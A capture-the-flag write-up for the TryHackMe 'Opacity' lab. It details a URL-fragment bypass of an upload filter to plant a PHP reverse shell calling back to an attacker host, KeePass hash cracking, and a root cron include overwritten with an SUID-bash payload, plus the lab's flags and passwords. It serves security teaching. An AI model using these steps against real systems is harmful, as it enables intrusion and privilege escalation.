# 🛡️ TryHackMe – Opacity - Writeup

## 📌 Overview
**Room Name:** Opacity  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web / File Upload / KeePass / Cron / PrivEsc

Linux machine with a custom URL-fetch file upload feature. Initial access via an extension-check bypass that smuggles a PHP reverse shell. Lateral movement through a cracked KeePass database, with root achieved by overwriting a PHP library included by a root cron job.

Attack chain overview:

- Port scan revealing SSH (22), HTTP (80), and Samba (139/445)
- gobuster discovers `/cloud/` — a URL-fetch file upload feature
- Extension check bypassed via URL fragment (`shell.php#.png`) → PHP shell uploaded
- Shell as `www-data`; hardcoded web password (`oncloud9`) found in `login.php` — not reused on the system
- pspy reveals root cron executing `script.php`; `backup.zip` exposes the source and its `backup.inc.php` include chain
- `/opt/dataset.kdbx` cracked with `keepass2john` → sysadmin credentials → user flag
- `backup.inc.php` overwritten with SUID payload → cron triggers → `bash -p` → root

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -- -sV -sC
```

```text
22/tcp  open  ssh     OpenSSH 8.2p1 (Ubuntu)
80/tcp  open  http    Apache httpd 2.4.41
139/tcp open  netbios Samba smbd 4
445/tcp open  smb     Samba smbd 4
```

Three potential entry points: HTTP (80), SMB (139/445), and SSH (22) as a last resort. Port 80 immediately redirected to `login.php` — confirming a PHP application. SMB with anonymous access was worth checking before diving into web exploitation.

---

## 🔍 2. SMB Enumeration

```bash
smbclient -L //<TARGET_IP> -N
```

```text
Sharename    Type    Comment
print$       Disk    Printer Drivers
IPC$         IPC     IPC Service
```

`print$` returned access denied; `IPC$` contained no files. `enum4linux` confirmed no users were recoverable. SMB was a dead end.

---

## 🔍 3. Web Enumeration

### Login Page

Browsing to `http://<TARGET_IP>` redirected to `login.php`. Manual attempts with common credentials (`admin/admin`, `admin/password`) all returned `Invalid Login Details`. Page source contained no hidden fields or comments.

### Directory Brute-Force

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

```text
/css        (Status: 301)
/index.php  (Status: 302) → login.php
/login.php  (Status: 200)
/logout.php (Status: 302) → login.php
```

Nothing beyond the auth flow. Switched to a larger wordlist:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

```text
/css    (Status: 301)
/cloud  (Status: 301) → http://<TARGET_IP>/cloud/
```

`/cloud/` discovered. ✅

---

## 🔓 4. Initial Access — File Upload Bypass

### /cloud/ Feature

Browsing to `http://<TARGET_IP>/cloud/` revealed a page titled **"5 Minutes File Upload — Personal Cloud Storage"** with a single input field: `External Url`.

Rather than accepting a direct upload, the application fetches a file from the provided URL server-side. Confirmed by starting a listener on Kali and submitting a test URL:

```bash
python3 -m http.server 80
```

Submitting `http://<LOCAL_IP>/test.png` in the URL field produced an inbound request:

```text
<TARGET_IP> - - "GET /test.png HTTP/1.1" 404
```

The title "5 Minutes File Upload" also indicated that uploaded files are auto-deleted after five minutes — timing would matter when triggering the shell.

### Extension Check Bypass

Submitting `http://<LOCAL_IP>/shell.php` produced no outbound request, confirming a server-side extension filter. Checking `index.php` later revealed the check:

```php
if (preg_match('/\.(jpeg|jpg|png|gif)$/i', $url))
```

The regex only validates the tail of the URL string. The URL fragment (`#`) is stripped by the browser before any HTTP request is made — so `shell.php#.png` satisfies the pattern (ends in `.png`) while the Kali server receives a request for `/shell.php`.

> **Why this works:** `preg_match` sees the full user-supplied string including `#.png`, so the pattern matches. When the target server fetches the URL, it transmits only the path — `shell.php` — without the fragment. The fragment is a client-side concept that never reaches the server.

Prepared a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
# Edit: set $ip = '<LOCAL_IP>', $port = 4444
```

Started a listener, then submitted `http://<LOCAL_IP>/shell.php#.png`:

```bash
nc -lvnp 4444
```

The file was saved at `/cloud/images/shell.php`. Browsing to `http://<TARGET_IP>/cloud/images/shell.php` triggered execution (the browser sends the path without the fragment, so the server processes it as PHP):

```text
connect to [<LOCAL_IP>] from (UNKNOWN) [<TARGET_IP>] 49336
uid=33(www-data) gid=33(www-data)
```

**Initial access as `www-data` achieved.** ✅

---

## 🔍 5. Post-Exploitation as www-data

### Users and Home Directories

```bash
ls /home
# sysadmin  ubuntu

ls -la /home/sysadmin/
# local.txt  → Permission denied
# scripts/   → suspicious directory
```

### Login.php — Hardcoded Password

```bash
cat /var/www/html/login.php
```

```php
$logins = array('admin' => 'oncloud9', 'root' => 'oncloud9', 'administrator' => 'oncloud9');
```

The web application hard-codes `oncloud9` for all users. Attempting `su sysadmin` with this password returned `Authentication failure` — web credentials are not reused on the system.

### scripts/ Directory

```bash
ls -la /home/sysadmin/scripts/
```

```text
drwxr-xr-x  root     root     scripts/
drwxr-xr-x  sysadmin root     lib/
-rw-r-----  root     sysadmin script.php  ← unreadable as www-data
```

```bash
ls -la /home/sysadmin/scripts/lib/
# -rw-r--r--  root  root  backup.inc.php  ← readable
```

`backup.inc.php` contained only a `zipData()` function. `script.php` was unreadable due to its permissions, but the `lib/` directory was owned by sysadmin — a note for later.

Standard privilege escalation checks (`sudo -l`, SUID binaries, capabilities) yielded nothing useful.

### Process Monitoring with pspy

With no obvious escalation path, monitoring live processes was the next step:

```bash
# Kali
python3 -m http.server 8080

# Target
cd /tmp
wget http://<LOCAL_IP>:8080/pspy64
chmod +x pspy64
./pspy64
```

```text
CMD: UID=0  /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php
```

Root runs `script.php` periodically via cron — not visible in `/etc/crontab` as `www-data`. Since `script.php` includes `lib/backup.inc.php`, overwriting that library would yield arbitrary code execution as root, but only after gaining sysadmin access to the `lib/` directory.

### Backup ZIP — Reading script.php

```bash
find / -name "*.zip" 2>/dev/null
# /var/backups/backup.zip

cp /var/backups/backup.zip /tmp/
cd /tmp && unzip backup.zip
```

The archive contained a copy of `script.php` and the full `lib/` directory. Since extraction is performed as `www-data`, the resulting files are owned by `www-data` — making the previously unreadable `script.php` accessible:

```php
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
// + deletes all files under /cloud/images/ every 5 minutes
```

> **Why the ZIP approach works:** The original `script.php` is protected by `-rw-r-----` with root ownership. Unzipping the backup as `www-data` creates new files owned by `www-data` — ZIP archives store metadata but file ownership on extraction follows the extracting user, not the archive.

The full attack path was now confirmed:  
`root cron → script.php → require_once(lib/backup.inc.php)` — overwrite `backup.inc.php` once sysadmin is obtained.

### KeePass Database

```bash
find / -name "*.kdbx" 2>/dev/null
# /opt/dataset.kdbx

ls -la /opt/
# -rwxrwxr-x  sysadmin  sysadmin  dataset.kdbx  ← world-readable
```

Transferred to Kali:

```bash
# Target
python3 -m http.server 8888

# Kali
wget http://<TARGET_IP>:8888/dataset.kdbx
```

Cracked the master password:

```bash
keepass2john dataset.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
741852963  (dataset)
```

Opening the database revealed:

```text
Username: sysadmin
Password: Cl0udP4ss40p4city#8700
```

---

## 🔀 6. Lateral Movement — www-data → sysadmin

```bash
ssh sysadmin@<TARGET_IP>
# Password: Cl0udP4ss40p4city#8700
```

```bash
cat /home/sysadmin/local.txt
```

**User flag retrieved.** ✅

---

## 👑 7. Privilege Escalation — Cron Library Injection

As sysadmin, the `lib/` directory is now writable (sysadmin-owned):

```bash
ls -la /home/sysadmin/scripts/
# drwxr-xr-x  sysadmin  root  lib/
```

Overwrote `backup.inc.php` with a payload that creates an SUID copy of bash:

```bash
echo '<?php exec("cp /bin/bash /tmp/bash; chmod +s /tmp/bash"); ?>' > /home/sysadmin/scripts/lib/backup.inc.php
```

After the root cron fired, confirmed the SUID bit was set:

```bash
ls -la /tmp/bash
# -rwsr-sr-x  1  root  root  1183448  /tmp/bash

/tmp/bash -p
whoami
# root
```

- `chmod +s` — sets the SUID bit, making `/tmp/bash` run as its owner (root)
- `bash -p` — preserves the effective UID from the SUID bit, opening a root shell

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```
6661b61b44d234d230d06bf5b3c075e2
```

### 👑 Root Flag

```
ac0d56f93202dd57dcb2498c739fd20e
```

---

## 📚 Key Takeaways

- 🔗 **URL fragments bypass server-side extension checks:** `preg_match` on the raw user-supplied URL sees `#.png`, satisfying the check — but the fragment is stripped before the HTTP request, so the actual file fetched has no image extension. Always validate after URL parsing, not against the raw string.

- 🔑 **Web credentials are not system credentials:** Finding a hardcoded password in a PHP file is a useful discovery, but `oncloud9` only worked for the web app. Password reuse across web and OS accounts should be verified but never assumed.

- 🔍 **pspy catches cron jobs invisible to low-privilege users:** `/etc/crontab` showed nothing useful as `www-data`. Monitoring live processes with pspy revealed the root cron that was the actual escalation path — a reminder that `cat /etc/crontab` is only part of the picture.

- 📦 **ZIP extraction does not preserve file ownership:** The unreadable `script.php` became accessible by extracting the backup archive as `www-data`. File permissions in ZIP archives are advisory; ownership is always set to the extracting user.

- 🏴 **KeePass databases on shared paths are high-value targets:** `dataset.kdbx` was world-readable in `/opt/`. A credential store for a system user sitting with open permissions is one `keepass2john` run away from lateral movement.

- ⚙️ **Writable PHP includes in root-executed scripts equal root:** Once the include chain (`script.php` → `backup.inc.php`) was mapped and `lib/` became writable, privilege escalation was deterministic. The library file is the weakest link in a cron-powered include chain.

---

## 🛠️ Tools Used

- `rustscan`
- `smbclient`, `enum4linux`
- `gobuster`
- `nc` (netcat)
- `python3` (HTTP server, PTY stabilization)
- `pspy`
- `keepass2john`, `john`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
